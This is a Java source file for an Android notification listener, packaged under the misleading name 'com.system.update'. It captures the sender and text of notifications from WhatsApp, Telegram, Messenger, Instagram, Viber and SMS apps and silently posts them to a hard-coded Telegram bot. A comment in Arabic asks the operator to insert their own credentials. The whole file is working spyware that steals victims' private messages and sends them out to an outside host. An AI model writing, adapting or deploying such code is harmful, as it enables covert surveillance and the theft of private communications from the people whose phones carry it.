package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.io.IOException;
import okhttp3.*;

public class NotificationService extends NotificationListenerService {
    // ⚠️ غير البيانات هنا
    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (pkg.equals("android") || pkg.contains("systemui") || pkg.contains("com.system.update")) return;

        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");

        if (text != null && !text.trim().isEmpty()) {
            if (pkg.contains("whatsapp") || pkg.contains("telegram") || pkg.contains("messenger") || 
                pkg.contains("instagram") || pkg.contains("viber") || pkg.contains("mms") || pkg.contains("sms")) {
                
                String msg = "🔔 **إشعار جديد:**\n" +
                             "**التطبيق:** `" + pkg + "`\n" +
                             "**من:** `" + (title != null ? title : "Unknown") + "`\n" +
                             "**النص:** `" + text + "`";
                sendTextToTelegram(msg);
            }
        }
    }

    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }
}
